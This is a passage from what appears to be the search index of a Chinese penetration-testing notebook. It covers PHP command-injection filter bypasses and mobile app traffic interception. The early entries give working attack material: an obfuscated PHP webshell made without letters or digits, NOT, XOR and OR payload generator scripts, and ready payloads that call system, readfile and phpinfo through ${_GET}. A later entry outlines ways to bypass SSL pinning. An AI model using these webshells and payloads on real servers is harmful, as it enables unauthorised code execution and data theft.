print(param)","title":"\u5f02\u6216"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_9","text":"<?php //\u5728\u547d\u4ee4\u884c\u4e2d\u8fd0\u884c fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';","title":"\u53d6\u53cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_10","text":"webshell\uff0c\u8bb0\u5f97urlencode $_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);","title":"\u81ea\u589e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_11","text":"\u811a\u672c import re from urllib.parse import unquote import requests preg = '[0-9a-z]'#(\\^)(\\+)(\\~)(\\$)(\\[)(\\])(\\{)(\\})(\\&)(\\-)]'\u53ef\u4ee5\u81ea\u5df1\u6539\u6b63\u5219 filename = 'Or.txt' with open(filename, \"w\") as file_ob: pass for i in range(256): if re.match(preg,chr(i),re.I): continue for j in range(256): if re.match(preg,chr(j),re.I): continue else: if(i < 16): hexI = '%0' + hex(i)[2:] else: hexI = '%' + hex(i)[2:] if(j < 16): hexJ = '%0' + hex(j)[2:] else: hexJ = '%' + hex(j)[2:] if((i|j) >= 32 and (i|j) <= 126): #print(chr(i) + '|'+ chr(j) + \" = \" + chr(i|j) + '--------' , i ,'|' , j , '=' , (i|j)) with open(filename, \"a\") as file_ob: file_ob.write(hexI + '|'+ hexJ + \"=\" + str(chr(i|j)) + '--------' + str(i) + '|' + str(j) + '=' + str((i|j)) + \"\\n\") def rep(args): payload = '' payload1 = '' payload2 = '' with open(filename) as file_ob: lines = file_ob.readlines() for i in args: for line in lines: #print(line) if line[8] == i: #print('(\\\"'+ line[:3] + '\\\"|\\\"' + line[4:7] + '\\\")', end = \"\") payload1 += line[:3] payload2 += line[4:7] break #print(payload) payload = '\\\"' + payload1 + '\\\"|\\\"'+ payload2 + '\\\"' return payload running = True while running: exp = rep(input(\"your payload:\\n\")) print(\"URL\u7f16\u7801\",exp) print(\"\u65e0URL\u7f16\u7801\",unquote(exp)) #url = 'http://' #data = {'c': unquote(exp)} #headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"} #r = requests.post(url, data = data) print(\"-------------\u7ed3\u679c--------------\") #print(r.text) print(\"\\n\") \u6bd4\u5982\u60f3\u6267\u884csystem(\"ls /\") \u5c31\u5f97\u8fd9\u6837","title":"\u6216\u8fd0\u7b97"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#payload","text":"${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff^%88%97%90%9E%92%96);&%ff=system ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=readfile ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(%ff%ff%ff%ff%ff%ff%ff%ff^%99%93%9E%98%D1%8F%97%8F);&%ff=highlight_file // \u5373: // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('whoami');&%ff=system // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=readfile // ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('flag.php');&%ff=highlight_file ${%ff%ff%ff%ff^%a0%b8%ba%ab} \u4ee3\u8868${_GET}: ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo \u5373: ${_GET}{%ff}();&%ff=phpinfo //?shell=${_GET}{%ff}();&%ff=phpinfo \u540c\u7406\u4e5f\u53ef\u4ee5\u53d6\u53cd ${~%A0%B8%BA%AB}{%ff}();&%ff=phpinfo ${~%A0%B8%BA%AB}{%ff}(~%88%97%90%9E%92%96);&%ff=system //system('whoami') \u4e5f\u53ef\u4ee5\u7528\u53cd\u5f15\u53f7\u52a0\u77ed\u6807\u7b7e ?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=ls / \u5373: ?><?=`$_GET[%ff]`?>&%ff=ls / \u6700\u5f00\u5934\u7684?>\u95ed\u5408\u4e86 eval() \u51fd\u6570\u81ea\u5e26\u7684<?\u6807\u7b7e\u3002\u63a5\u4e0b\u6765\u4f7f\u7528\u4e86\u77ed\u6807\u7b7e\u4ee3\u66ff<?php echo ... ?>\u3002{}\u91cc\u9762\u5305\u542b\u7684 PHP \u4ee3\u7801\u53ef\u4ee5\u88ab\u6267\u884c\uff0c~%A0%B8%BA%AB\u4e3a_GET\uff0c\u6700\u540e\u5c06\u901a\u8fc7\u53c2\u6570%ff\u4f20\u5165\u7684\u503c\u4f7f\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u3002","title":"\u9a9apayload"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_12","text":"\u7b80\u5355\uff0c\u6211\u4eec\u4e0a\u9762\u6709\u5f88\u591apayload\u538b\u6839\u5c31\u6ca1\u7528\u5230_","title":"\u4e0b\u5212\u7ebf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_13","text":"\u65e0\u9700\u62c5\u5fc3\uff0c\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u8bf4\u4e86\uff0cPHP \u77ed\u6807\u7b7e\u4e2d\u7684\u4ee3\u7801\u4e0d\u9700\u8981\u5199\u5206\u53f7\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u628a\u6240\u6709\u7684 PHP \u8bed\u53e5\u6539\u6210\u77ed\u6807\u7b7e\u5f62\u5f0f\u5c31\u884c\u4e86\u3002 <?=echo (1)?>","title":"\u5206\u53f7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#_14","text":"\u5982\u679cphp7\u4ee5\u4e0a\uff0c\u53ef\u4ee5\u7528\u6216\u8fd0\u7b97\u6216\u8005\u5f02\u6216\u6765\u7ed5\u8fc7\uff0c\u56e0\u4e3a\u5176payload\u91cc\u6ca1\\$\u7b26\u3002\u539f\u56e0\u662fphp7\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528(\\$a)()\u8fd9\u79cd\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4 \u5728 PHP 5 \u4e2d\u5982\u679c\u6211\u4eec\u8fd8\u4f7f\u7528 ('phpinfo')(); \u8fd9\u6837\u7684 PHP \u8868\u8fbe\u5f0f\u5219\u4f1a\u5f97\u5230\u4e00\u4e2a\u62a5\u9519\uff0c\u539f\u56e0\u5c31\u662f PHP 5 \u5e76\u4e0d\u652f\u6301\u8fd9\u79cd\u8868\u8fbe\u65b9\u5f0f\u3002\u6240\u4ee5\uff0c\u5982\u679c\u4e5f\u8fc7\u6ee4\u4e86 $ \u7684\u8bdd\uff0c\u5bf9\u4e8e PHP 5 \u73af\u5883\u7684\u5229\u7528\u65b9\u6cd5\u5c31\u5f88\u590d\u6742\u4e86\u3002","title":"\\$\u7b26"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%AF%B9%E6%8A%97/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/#php57","text":"\u5728\u7814\u7a76\u65e0\u6570\u5b57\u5b57\u6bcdrce\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u51fd\u6570\u5c31\u662f assert \uff0c\u4f46\u5728php5\u7684\u7248\u672c\u548cphp7\u7684\u7248\u672c\u4e2d\uff0c\u5b83\u662f\u6709\u4e00\u4e9b\u533a\u522b\u7684\uff0c\u6211\u4eec\u4e0a\u9762\u7684\u6d4b\u8bd5\u90fd\u662f\u57fa\u4e8ephp5\u8fdb\u884c\u7684\uff0c\u5728php5\u4e2dassert\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 $f='assert';$f(...); \u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u52a8\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5728php7\u4e2d\uff0cassert\u4e0d\u518d\u662f\u51fd\u6570\uff0c\u53d8\u6210\u4e86\u4e00\u4e2a\u8bed\u8a00\u7ed3\u6784\uff08\u7c7b\u4f3ceval\uff09\uff0c\u4e0d\u80fd\u518d\u4f5c\u4e3a\u51fd\u6570\u540d\u52a8\u6001\u6267\u884c\u4ee3\u7801 \u4f46\u662f\u5728php7\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528(\\$a)()\u8fd9\u79cd\u65b9\u6cd5\u6765\u6267\u884c\u547d\u4ee4\uff0c\u90a3\u76f8\u5f53\u4e8e\u6211\u4eec\u5bf9phpinfo\u53d6\u53cd\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4e86\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9file_put_contents()\u6765\u5199\u5165shell\uff0c\u5728php5\u4e2d\u8fd9\u6837\u662f\u4e0d\u884c\u7684\uff1a","title":"php5\u548c7\u7684\u533a\u522b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/","text":"\u793e\u5de5\ud83d\udc56 phonebook.cz","title":"\u793e\u5de5\ud83d\udc56"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/%E7%A4%BE%E5%B7%A5%F0%9F%91%96/#_1","text":"phonebook.cz","title":"\u793e\u5de5\ud83d\udc56"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/","text":"\u79fb\u52a8\u7aef APP\u6e17\u900f \u5fae\u4fe1","title":"\u79fb\u52a8\u7aef"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E7%A7%BB%E5%8A%A8%E7%AB%AF/#_1","text":"APP\u6e17\u900f \u5fae\u4fe1","title":"\u79fb\u52a8\u7aef"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/","text":"APP\u6e17\u900f \u76ee\u5f55 \u6293\u5305 \u5355\u5411\u8ba4\u8bc1 SSL pining \u53cc\u5411\u8ba4\u8bc1 \u6293\u5305\u5b9e\u64cd \u5b89\u53537\u4ee5\u4e0b\u7248\u672c \u5b89\u53537\u4ee5\u4e0a\u7248\u672c \u68c0\u6d4b\u4ee3\u7406\u529f\u80fd root\u9690\u85cf ios\u6293\u5305 mac\u6293\u5305 adb\u4f7f\u7528 \u5bf9\u6297\u5927\u81f4\u6709\u8fd9\u51e0\u7c7b \u00b7\u65e0\u9632\u8303\u63aa\u65bd\uff0c\u76f4\u63a5\u4e0aburp\uff0c\u628aCA\u8bc1\u4e66\u88c5\u597d\u5c31\u53ef\u4ee5\u6293\u5305\u4e86\uff08\u4ec5\u91c7\u7528\u5355\u5411\u8ba4\u8bc1\uff0c\u6216\u8005\u6839\u672c\u5c31\u6ca1\u6709\u8bc1\u4e66\u9a8c\u8bc1\u529f\u80fd\uff09 \u00b7 \u91c7\u7528ssl pining\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7 \u4f7f\u7528\u53cc\u5411\u8ba4\u8bc1\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7\u68c0\u6d4b\u6a21\u62df\u5668\uff0c\u4ee5\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7\u68c0\u6d4b\u662f\u5426\u542f\u7528\u4e86\u4ee3\u7406\uff0c\u6765\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305\uff08\u4f60\u6293\u5305\u80af\u5b9a\u8981\u8d70\u4ee3\u7406\u662f\u5427\uff09 \u00b7\u68c0\u6d4b\u662f\u5426root\u8fc7\uff0croot\u8fc7\u5c31\u95ea\u9000\uff0c\u6765\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u6293\u5305 \u5305\u90fd\u6293\u4e0d\u4e86\uff0c\u8c08\u4f55\u6e17\u900f\u3002 app\u6293\u5305\u4f1a\u9047\u5230\u5927\u81f4\u4e0b\u5217\u8ba4\u8bc1\u65b9\u5f0f\u3002\u6211\u4eec\u4e00\u4e00\u8ba8\u8bba \u5355\u5411\u8ba4\u8bc1 \u5355\u5411\u8ba4\u8bc1\u662fHTTPS\u4e2d\uff0c\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u7aef\u8fdb\u884c\u8eab\u4efd\u6821\u9a8c\u7684\u4e00\u4e2a\u73af\u8282\u3002 \u4f46\u662f\u8fd9\u4e2a\u8eab\u4efd\u6821\u9a8c\u53ef\u4ee5\u88ab\u8f7b\u800c\u6613\u4e3e\u7684\u7ed5\u8fc7\uff0c\u5982\u679c\u76ee\u6807APP\u4ec5\u4f7f\u7528\u4e86\u5355\u5411\u8ba4\u8bc1\u800c\u6ca1\u6709\u989d\u5916\u542f\u7528SSL pining\u9632\u62a4\u7684\u8bdd\uff0c\u90a3\u5c31\u7b49\u540c\u4e8e\u6ca1\u6709\u9632\u8303\u63aa\u65bd\uff0c\u76f4\u63a5\u628aburp\u751f\u6210\u7684CA\u8bc1\u4e66\u5728\u624b\u673a\u91cc\u88c5\u597d\u5c31\u53ef\u4ee5\u6293\u5b83\u7684\u5305\u4e86\u3002 \u4e0a\u56fe\u662fHTTPS\u5355\u5411\u8ba4\u8bc1\u7684\u4e00\u4e2a\u6d41\u7a0b\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u53ea\u505a\u4e86\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u7aef\u7684\u6821\u9a8c\u3002 \u90a3\u4e48burp\u662f\u5982\u4f55\u7ed5\u8fc7\u5355\u5411\u8ba4\u8bc1\u8fdb\u884c\u6293\u5305\u7684\u5462\uff1f\u7b54\u6848\u5728\u4e8eburp\u751f\u6210\u7684\u90a3\u5f20CA\u8bc1\u4e66\u3002 \u5728\u4e86\u89e3\u5355\u5411\u8ba4\u8bc1\u4e4b\u524d\uff0c\u6211\u4e00\u76f4\u4e0d\u4e86\u89e3\u4e3a\u4ec0\u4e48\u4f7f\u7528burp\u6293\u5305\u7684\u65f6\u5019\u8981\u4e13\u95e8\u5728\u6d4f\u89c8\u5668\u4e2d\u5b89\u88c5\u4e00\u4e2aCA\u8bc1\u4e66\uff0c\u73b0\u5728\u77e5\u9053\u539f\u56e0\u4e86\uff1aBurp\u751f\u6210\u7684CA\u8bc1\u4e66\u662f\u4f2a\u9020\u51fa\u6765\u7ed9\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\u3001APP\uff09\u770b\u7684\uff0c\u51c6\u786e\u6765\u8bf4\u751f\u6210\u7684\u662fCA\u8bc1\u4e66\u7684\u6839\u8bc1\u4e66\uff0c\u5176\u5305\u542b\u516c\u94a5\u3001\u6563\u5217\u503c\u7b49\u4fe1\u606f\uff0c\u516c\u94a5\u7528\u6765\u89e3\u5bc6\u4f5c\u4e3a\u4e2d\u95f4\u4eba\u7684burp\u53d1\u6765\u7684CA\u8bc1\u4e66\uff0c\u83b7\u53d6B_\u516c\u94a5\uff08CA\u8bc1\u4e66\u4f7f\u7528\u79c1\u94a5\u52a0\u5bc6\uff0c\u516c\u94a5\u89e3\u5bc6\uff09\uff0c\u8fd9\u4e00\u6b65\u5bf9\u5e94\u7740\u4e0a\u56fe\u4e2d\u7684\u201c\u81ea\u5df1\u5148\u64cd\u4f5c\u4e00\u6ce2\u201d\u7684\u5185\u5bb9\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u89e3\u5bc6\u540e\u7684\u5185\u5bb9\u7684\u6563\u5217\u503c\u4e5f\u4f1a\u4e0e\u516c\u94a5\u9644\u5e26\u7684\u6563\u5217\u503c\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5224\u65ad\u8bc1\u4e66\u662f\u5426\u4e00\u81f4\u3002 \u4e2d\u95f4\u4eba\u5e76\u4e0d\u4f1a\u628a\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u8bc1\u4e66\u539f\u5c01\u4e0d\u52a8\u7684\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff08\u56e0\u4e3a\u5982\u679c\u539f\u5c01\u4e0d\u52a8\u7684\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u540e\u7eed\u5ba2\u6237\u7aef\u7528\u8bc1\u4e66\u83b7\u53d6\u7684\u516c\u94a5\u6765\u52a0\u5bc6\u7684\u5bc6\u94a5F\u5bf9\u4e8e\u4e2d\u95f4\u4eba\u6765\u8bf4\u5c31\u662f\u672a\u77e5\u7684\u4e86\uff0c\u56e0\u4e3a\u4e2d\u95f4\u4eba\u6ca1\u6709\u8bc1\u4e66\u5bf9\u5e94\u7684\u79c1\u94a5\u89e3\u5bc6\u83b7\u53d6\u5bc6\u94a5F\uff09\uff0c\u800c\u662f\u81ea\u5df1\u751f\u6210\u4e00\u5f20\u65b0\u7684\u4f2a\u9020\u7684\u8bc1\u4e66\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u56e0\u4e3a\u8bc1\u4e66\u662f\u81ea\u5df1\u751f\u6210\u7684\uff0c\u6240\u4ee5\u77e5\u9053\u8be5\u8bc1\u4e66\u7684\u79c1\u94a5\uff0c\u4ece\u800c\u89e3\u5bc6\u83b7\u5f97\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u5bc6\u94a5F\uff0c\u4ece\u800c\u622a\u83b7\u5ba2\u6237\u7aef\u53d1\u51fa\u6765\u7684\u8bf7\u6c42\u3002 \u800c\u7531\u4e8e\u670d\u52a1\u7aef\u5bf9\u5ba2\u6237\u7aef\u5e76\u6ca1\u6709\u8bc1\u4e66\u6821\u9a8c\u8fd9\u4e2a\u73af\u8282\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u4e2d\u95f4\u4eba\u4e0d\u9700\u8981\u63d0\u4f9b\u4efb\u4f55\u51ed\u8bc1\uff0c\u53ea\u9700\u8981\u7eaf\u7eaf\u7684\u6a21\u62df\u5ba2\u6237\u7aef\u7684\u884c\u4e3a\u5373\u53ef\u3002 \u968f\u540e\u4e2d\u95f4\u4eba\u5c31\u83b7\u5f97\u4e86 \u5ba2\u6237\u7aef-\u4e2d\u95f4\u4eba\u7684\u5bc6\u94a5F1\uff0c\u670d\u52a1\u7aef-\u4e2d\u95f4\u4eba\u7684\u5bc6\u94a5F2\uff0c\u7136\u540e\u53ea\u9700\u628a\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u6570\u636e\u7528F1\u89e3\u5bc6\uff0c\u7136\u540e\u7528F2\u52a0\u5bc6\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u628a\u670d\u52a1\u7aef\u53d1\u6765\u7684\u6570\u636e\u7528F2\u89e3\u5bc6\uff0cF1\u52a0\u5bc6\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u5373\u53ef\uff0c\u4e2d\u95f4\u8fd8\u53ef\u4ee5\u7be1\u6539\u6d88\u606f\u5185\u5bb9\uff0c\u5b9e\u73b0\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b8c\u6210\u4e86\u6293\u5305\u3002 SSL pining https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning \u5382\u5546\u4eec\u81ea\u7136\u4e5f\u4e0d\u662f\u50bb\u5b50\uff0c\u77e5\u9053\u5355\u9760\u5355\u5411\u8ba4\u8bc1\u65e0\u6cd5\u9632\u6b62\u6293\u5305\u540e\uff0c\u5c31\u63a8\u51fa\u4e86\u4e24\u79cd\u9632\u8303\u63aa\u65bd\uff1a\u9488\u5bf9\u5355\u5411\u8ba4\u8bc1\u5b89\u5168\u6027\u7684\u4f18\u5316\u65b9\u6848SSL pining\u548c\u65b0\u7684\u4e00\u5957\u8ba4\u8bc1\u6a21\u5f0f\u53cc\u5411\u8ba4\u8bc1\u3002\u8fd9\u91cc\u5c31\u5148\u8bf4\u8bf4SSL pining\u8fd9\u4e2a\u4f7f\u7528\u5e7f\u6cdb\u4e00\u70b9\u7684\u4fdd\u62a4\u63aa\u65bd\u3002 ssl pining\u662f\u7528\u4e8e\u9632\u8303\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u6280\u672f\uff0c\u88ab\u7528\u4e8eHTTPS\u4e2d\u3002 \u53ef\u4ee5\u770b\u4f5c\u662f\u4e3a\u5355\u5411\u8ba4\u8bc1\u6253\u9020\u7684\u4e00\u5957\u9632\u8303\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u63aa\u65bd\u3002\u5b83\u7684\u6838\u5fc3\u601d\u60f3\u662f\u628a\u670d\u52a1\u7aef\u8bc1\u4e66\u7684\u5173\u952e\u4fe1\u606f\u5199\u5165\u4ee3\u7801\u5c42\uff0c\u5de5\u4f5c\u65f6\u89e3\u5bc6\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\uff0c\u5c06\u5176\u4e0e\u4ee3\u7801\u5c42\u5199\u6b7b\u7684\u7edd\u5bf9\u771f\u5b9e\u7684\u670d\u52a1\u7aef\u8bc1\u4e66\u7684\u5173\u952e\u4fe1\u606f\u8fdb\u884c\u6bd4\u5bf9\uff0c\u4ece\u800c\u5224\u65ad\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u662f\u5426\u662f\u4f2a\u9020\u7684\u3002 SSL pining\u7ec6\u5206\u4e3a\u4e24\u79cd\uff0c\u5206\u522b\u662f \u8bc1\u4e66\u9501\u5b9a\uff08Certificate Pinning\uff09\u548c\u516c\u94a5\u9501\u5b9a\uff08Public Key Pinning\uff09 \u6240\u8c13\u8bc1\u4e66\u9501\u5b9a\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\uff08APP\uff09\u4ee3\u7801\u5c42\u5199\u6b7b\u4e86\u6240\u80fd\u63a5\u53d7\u7684\u8bc1\u4e66\u7684\u6563\u5217\u503c\uff0c\u5982\u679c\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u7684\u6563\u5217\u503c\u4e0e\u5176\u4e0d\u4e00\u81f4\uff0c\u5219\u4f7f\u672c\u6b21\u901a\u8baf\u8ba4\u8bc1\u5931\u8d25\u3002\u503c\u5f97\u4e00\u63d0\u7684\u662f\u8bc1\u4e66\u9501\u5b9a\u5728\u8bc1\u4e66\u9700\u8981\u7ecf\u5e38\u66f4\u6362\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u4e5f\u9700\u8981\u8ddf\u7740\u66f4\u65b0\u5185\u90e8\u4ee3\u7801\u4e2d\u8bc1\u4e66\u7684\u6563\u5217\u503c\u3002 \u6240\u8c13\u516c\u94a5\u9501\u5b9a\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\uff08APP\uff09\u4ee3\u7801\u5c42\u5199\u6b7b\u4e86\u8bc1\u4e66\u89e3\u5f00\u540e\u7684\u516c\u94a5\uff0c\u7136\u540e\u4e0e\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u89e3\u5f00\u540e\u7684\u516c\u94a5\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5224\u65ad\u662f\u5426\u4e00\u81f4\u3002 \u8fd9\u6837\u770b\u6765\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528SSL pining\u540e\u8fd8\u4f1a\u68c0\u9a8c\u8bc1\u4e66\uff0c\u6211\u4eec\u4f2a\u9020\u4e00\u4e2aCA\u8bc1\u4e66\u7ed9\u5ba2\u6237\u7aef\u7684\u65b9\u6848\u4f3c\u4e4e\u884c\u4e0d\u901a\u4e86\uff0c\u90a3\u600e\u4e48\u7ed5\u8fc7\u5462\uff1f \u7ed5\u8fc7\u65b9\u6848 1.\u53cd\u7f16\u8bd1\u5254\u9664\u6821\u9a8c\u4ee3\u7801 \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u53cd\u7f16\u8bd1\u76ee\u6807APK\uff0c\u7136\u540e\u5254\u9664\u6821\u9a8c\u8bc1\u4e66\u7684\u4ee3\u7801\uff0c\u518d\u91cd\u65b0\u7f16\u8bd1\u6210apk\u3002\u524d\u63d0\u6761\u4ef6\u662f\u76ee\u6807APP\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5. \u4ee3\u7801\u5173\u952e\u5b57\uff1acheckserver\u3001certification\u3002certificate\u3001X509 2.Xposed\u6846\u67b6+JustTrustMe\uff08\u9700root\uff09 